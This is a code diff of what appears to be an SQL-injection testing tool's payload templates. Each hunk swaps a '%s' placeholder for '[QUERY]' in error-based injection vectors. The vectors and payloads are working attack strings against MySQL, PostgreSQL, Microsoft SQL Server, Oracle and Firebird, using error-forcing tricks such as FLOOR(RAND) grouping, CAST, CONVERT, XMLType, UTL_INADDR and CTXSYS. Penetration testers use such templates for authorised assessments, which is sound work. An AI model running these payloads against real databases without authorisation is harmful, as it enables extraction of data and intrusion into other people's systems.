@@ -741,7 +741,7 @@ Formats:
         <risk>0</risk>
         <clause>1</clause>
         <where>1</where>
-        <vector>AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(%s),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)</vector>
+        <vector>AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)</vector>
         <request>
             <payload>AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)</payload>
         </request>
@@ -761,7 +761,7 @@ Formats:
         <risk>0</risk>
         <clause>1</clause>
         <where>1</where>
-        <vector>AND [RANDNUM]=CAST('[DELIMITER_START]'||(%s)::text||'[DELIMITER_STOP]' AS NUMERIC)</vector>
+        <vector>AND [RANDNUM]=CAST('[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]' AS NUMERIC)</vector>
         <request>
             <payload>AND [RANDNUM]=CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC)</payload>
         </request>
@@ -780,7 +780,7 @@ Formats:
         <risk>0</risk>
         <clause>1</clause>
         <where>1</where>
-        <vector>AND [RANDNUM]=CONVERT(INT,('[DELIMITER_START]'+(%s)+'[DELIMITER_STOP]'))</vector>
+        <vector>AND [RANDNUM]=CONVERT(INT,('[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]'))</vector>
         <request>
             <payload>AND [RANDNUM]=CONVERT(INT,('[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]'))</payload>
         </request>
@@ -799,7 +799,7 @@ Formats:
         <risk>0</risk>
         <clause>1</clause>
         <where>1</where>
-        <vector>AND [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||'[DELIMITER_START]'||(REPLACE((%s),' ','[SPACE_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</vector>
+        <vector>AND [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||'[DELIMITER_START]'||(REPLACE(([QUERY]),' ','[SPACE_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</vector>
         <request>
             <payload>AND [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||'[DELIMITER_START]'||(REPLACE((SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL),' ','[SPACE_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</payload>
         </request>
@@ -818,7 +818,7 @@ Formats:
         <risk>0</risk>
         <clause>1</clause>
         <where>1</where>
-        <vector>AND [RANDNUM]=UTL_INADDR.GET_HOST_ADDRESS('[DELIMITER_START]'||(%s)||'[DELIMITER_STOP]')</vector>
+        <vector>AND [RANDNUM]=UTL_INADDR.GET_HOST_ADDRESS('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')</vector>
         <request>
             <payload>AND [RANDNUM]=UTL_INADDR.GET_HOST_ADDRESS('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]')</payload>
         </request>
@@ -838,7 +838,7 @@ Formats:
         <risk>0</risk>
         <clause>1</clause>
         <where>1</where>
-        <vector>AND [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM], '[DELIMITER_START]'||(%s)||'[DELIMITER_STOP]')</vector>
+        <vector>AND [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM], '[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')</vector>
         <request>
             <payload>AND [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM],('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'))</payload>
         </request>
@@ -857,7 +857,7 @@ Formats:
         <risk>0</risk>
         <clause>1</clause>
         <where>1</where>
-        <vector>AND [RANDNUM]=('[DELIMITER_START]'||(%s)||'[DELIMITER_STOP]')</vector>
+        <vector>AND [RANDNUM]=('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')</vector>
         <request>
             <payload>AND [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]')</payload>
         </request>
@@ -876,7 +876,7 @@ Formats:
         <risk>2</risk>
         <clause>1</clause>
         <where>2</where>
-        <vector>OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(%s),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)</vector>
+        <vector>OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)</vector>
         <request>
             <payload>OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)</payload>
         </request>
@@ -896,7 +896,7 @@ Formats:
         <risk>2</risk>
         <clause>1</clause>
         <where>2</where>
-        <vector>OR 1 GROUP BY CONCAT('[DELIMITER_START]',(%s),'[DELIMITER_STOP]',FLOOR(RAND(0)*2)) HAVING MIN(0)</vector>
+        <vector>OR 1 GROUP BY CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2)) HAVING MIN(0)</vector>
         <request>
             <payload>OR 1 GROUP BY CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2)) HAVING MIN(0)</payload>
             <comment>#</comment>
@@ -916,7 +916,7 @@ Formats:
         <risk>2</risk>
         <clause>1</clause>
         <where>2</where>
-        <vector>OR [RANDNUM]=CAST('[DELIMITER_START]'||(%s)::text||'[DELIMITER_STOP]' AS NUMERIC)</vector>
+        <vector>OR [RANDNUM]=CAST('[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]' AS NUMERIC)</vector>
         <request>
             <payload>OR [RANDNUM]=CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC)</payload>
         </request>
@@ -935,7 +935,7 @@ Formats:
         <risk>2</risk>
         <clause>1</clause>
         <where>2</where>
-        <vector>OR [RANDNUM]=CONVERT(INT,('[DELIMITER_START]'+(%s)+'[DELIMITER_STOP]'))</vector>
+        <vector>OR [RANDNUM]=CONVERT(INT,('[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]'))</vector>
         <request>
             <payload>OR [RANDNUM]=CONVERT(INT,('[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]'))</payload>
         </request>
@@ -954,7 +954,7 @@ Formats:
         <risk>2</risk>
         <clause>1</clause>
         <where>2</where>
-        <vector>OR [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||'[DELIMITER_START]'||(REPLACE((%s),' ','[SPACE_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</vector>
+        <vector>OR [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||'[DELIMITER_START]'||(REPLACE(([QUERY]),' ','[SPACE_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</vector>
         <request>
             <payload>OR [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||'[DELIMITER_START]'||(REPLACE((SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL),' ','[SPACE_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</payload>
         </request>
@@ -973,7 +973,7 @@ Formats:
         <risk>2</risk>
         <clause>1</clause>
         <where>2</where>
-        <vector>OR [RANDNUM]=UTL_INADDR.GET_HOST_ADDRESS('[DELIMITER_START]'||(%s)||'[DELIMITER_STOP]')</vector>
+        <vector>OR [RANDNUM]=UTL_INADDR.GET_HOST_ADDRESS('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')</vector>
         <request>
             <payload>OR [RANDNUM]=UTL_INADDR.GET_HOST_ADDRESS('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]')</payload>
         </request>
@@ -993,7 +993,7 @@ Formats:
         <risk>2</risk>
         <clause>1</clause>
         <where>2</where>
-        <vector>OR [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM], '[DELIMITER_START]'||(%s)||'[DELIMITER_STOP]')</vector>
+        <vector>OR [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM], '[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')</vector>
         <request>
             <payload>OR [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM],('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'))</payload>
         </request>
@@ -1012,7 +1012,7 @@ Formats:
         <risk>2</risk>
         <clause>1</clause>
         <where>2</where>
-        <vector>OR [RANDNUM]=('[DELIMITER_START]'||(%s)||'[DELIMITER_STOP]')</vector>
+        <vector>OR [RANDNUM]=('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')</vector>
         <request>
             <payload>OR [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]')</payload>
         </request>
@@ -1038,7 +1038,7 @@ Formats:
         <risk>0</risk>
         <clause>1,2,3</clause>
         <where>3</where>
-        <vector>(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(%s),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)</vector>
+        <vector>(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)</vector>
         <request>
             <payload>(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)</payload>
         </request>
@@ -1058,7 +1058,7 @@ Formats:
         <risk>0</risk>
         <clause>1,2,3</clause>
         <where>3</where>
-        <vector>(CAST('[DELIMITER_START]'||(%s)::text||'[DELIMITER_STOP]' AS NUMERIC))</vector>
+        <vector>(CAST('[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]' AS NUMERIC))</vector>
         <request>
             <payload>(CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC))</payload>
         </request>
@@ -1077,7 +1077,7 @@ Formats:
         <risk>0</risk>
         <clause>1,3</clause>
         <where>3</where>
-        <vector>(CONVERT(INT,('[DELIMITER_START]'+(%s)+'[DELIMITER_STOP]')))</vector>
+        <vector>(CONVERT(INT,('[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]')))</vector>
         <request>
             <payload>(CONVERT(INT,('[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')))</payload>
         </request>
@@ -1096,7 +1096,7 @@ Formats:
         <risk>0</risk>
         <clause>1,3</clause>
         <where>3</where>
-        <vector>(SELECT UPPER(XMLType(CHR(60)||'[DELIMITER_START]'||(REPLACE((%s),' ','[SPACE_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</vector>
+        <vector>(SELECT UPPER(XMLType(CHR(60)||'[DELIMITER_START]'||(REPLACE(([QUERY]),' ','[SPACE_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</vector>
         <request>
             <payload>(SELECT UPPER(XMLType(CHR(60)||'[DELIMITER_START]'||(REPLACE((SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL),' ','[SPACE_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</payload>
         </request>
@@ -1115,7 +1115,7 @@ Formats:
         <risk>0</risk>
         <clause>1,3</clause>
         <where>3</where>
-        <vector>(SELECT [RANDNUM]=('[DELIMITER_START]'||(%s)||'[DELIMITER_STOP]'))</vector>
+        <vector>(SELECT [RANDNUM]=('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]'))</vector>
         <request>
             <payload>(SELECT [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]'))</payload>
         </request>
@@ -1137,7 +1137,7 @@ Formats:
         <risk>0</risk>
         <clause>2,3</clause>
         <where>1</where>
-        <vector>, (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(%s),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)</vector>
+        <vector>, (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)</vector>
         <request>
             <payload>, (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)</payload>
         </request>
@@ -1157,7 +1157,7 @@ Formats:
         <risk>0</risk>
         <clause>2,3</clause>
         <where>1</where>
-        <vector>, (CAST('[DELIMITER_START]'||(%s)::text||'[DELIMITER_STOP]' AS NUMERIC))</vector>
+        <vector>, (CAST('[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]' AS NUMERIC))</vector>
         <request>
             <payload>, (CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC))</payload>
         </request>
@@ -1176,7 +1176,7 @@ Formats:
         <risk>0</risk>
         <clause>3</clause>
         <where>1</where>
-        <vector>, (CONVERT(INT,('[DELIMITER_START]'+(%s)+'[DELIMITER_STOP]')))</vector>
+        <vector>, (CONVERT(INT,('[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]')))</vector>
         <request>
             <payload>, (CONVERT(INT,('[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')))</payload>
         </request>
@@ -1195,7 +1195,7 @@ Formats:
         <risk>0</risk>
         <clause>2,3</clause>
         <where>1</where>
-        <vector>, (SELECT UPPER(XMLType(CHR(60)||'[DELIMITER_START]'||(REPLACE((%s),' ','[SPACE_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</vector>
+        <vector>, (SELECT UPPER(XMLType(CHR(60)||'[DELIMITER_START]'||(REPLACE(([QUERY]),' ','[SPACE_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</vector>
         <request>
             <payload>, (SELECT UPPER(XMLType(CHR(60)||'[DELIMITER_START]'||(REPLACE((SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL),' ','[SPACE_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</payload>
         </request>
